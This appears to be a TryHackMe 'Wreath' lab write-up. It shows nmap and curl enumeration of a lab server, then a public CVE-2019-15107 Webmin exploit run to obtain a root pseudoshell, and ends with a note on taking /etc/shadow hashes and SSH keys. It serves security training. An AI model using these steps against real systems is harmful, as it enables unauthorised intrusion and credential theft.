# Room
https://tryhackme.com/room/wreath

# Task 1 - Intro
* Pivoting
* C2
* Evasion

# Task 2 - Accessing the Network
Access

# Task 3 - Back Story
Story

# Task 4 - Brief
Three machines, public web server, git

# Task 5 - Web server Enumeration - nmap
* nmap
```
nmap -A -T4 10.200.98.200 -p 1-15000 | tee 10.200.98.200-nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:35 EDT
Nmap scan report for 10.200.98.200
Host is up (0.13s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2021-03-22T22:28:10
|_Not valid after:  2022-03-22T22:28:10
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.73 seconds
```
* check web port
```
curl -IvL http://10.200.98.200
*   Trying 10.200.98.200:80...
* Connected to 10.200.98.200 (10.200.98.200) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.200.98.200
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Date: Mon, 22 Mar 2021 22:38:57 GMT
Date: Mon, 22 Mar 2021 22:38:57 GMT
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
< Location: https://thomaswreath.thm
Location: https://thomaswreath.thm
< Content-Type: text/html; charset=iso-8859-1
Content-Type: text/html; charset=iso-8859-1

< 
* Connection #0 to host 10.200.98.200 left intact
* Issue another request to this URL: 'https://thomaswreath.thm/'
* Could not resolve host: thomaswreath.thm
* Closing connection 1
curl: (6) Could not resolve host: thomaswreath.thm
```
* point name to remote IP in hosts file
```
cat /etc/hosts | grep 10.200
10.200.98.200 thomaswreath.thm
```
* check web again, success
```
curl -ILk http://10.200.98.200
HTTP/1.1 302 Found
Date: Mon, 22 Mar 2021 22:42:00 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Location: https://thomaswreath.thm
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Mon, 22 Mar 2021 22:42:01 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Last-Modified: Sat, 07 Nov 2020 22:15:05 GMT
ETag: "3c17-5b38ba949f993"
Accept-Ranges: bytes
Content-Length: 15383
Content-Type: text/html; charset=UTF-8
```

# Task 6 - Web server Exploitation
* clone repo, install requirements, set executable bit
```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
Cloning into 'CVE-2019-15107'...
remote: Enumerating objects: 29, done.
remote: Counting objects: 100% (29/29), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 29 (delta 9), reused 14 (delta 3), pack-reused 0
Receiving objects: 100% (29/29), 19.47 KiB | 1.02 MiB/s, done.
Resolving deltas: 100% (9/9), done.

pip3 install -r requirements.txt 
Collecting argparse
  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Requirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 2)) (2.20.0)
Requirement already satisfied: urllib3 in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 3)) (1.24.3)
Requirement already satisfied: prompt_toolkit in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (3.0.14)
Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /usr/local/lib/python3.9/dist-packages (from requests->-r requirements.txt (line 2)) (3.0.4)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->-r requirements.txt (line 2)) (2020.6.20)
Requirement already satisfied: idna<2.8,>=2.5 in /usr/local/lib/python3.9/dist-packages (from requests->-r requirements.txt (line 2)) (2.7)
Installing collected packages: argparse
Successfully installed argparse-1.4.0

chmod +x CVE-2019-15107.py
```
* run the exploit code
```
./CVE-2019-15107.py 10.200.98.200                                                                                      
                                                                                                                                                                               
        __        __   _               _         ____   ____ _____                                                                                                             
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                            
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                              
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                             
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                             
                                                                                                                                                                               
                                                @MuirlandOracle                                                                                                                
                                                                                                                                                                               
                                                                                                                                                                               
[*] Server is running in SSL mode. Switching to HTTPS                                                                                                                          
[+] Connected to https://10.200.98.200:10000/ successfully.          
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
#
```
* with root access grab root password hash from /etc/shadow, grab SSH keys, chmod 600 file, test keys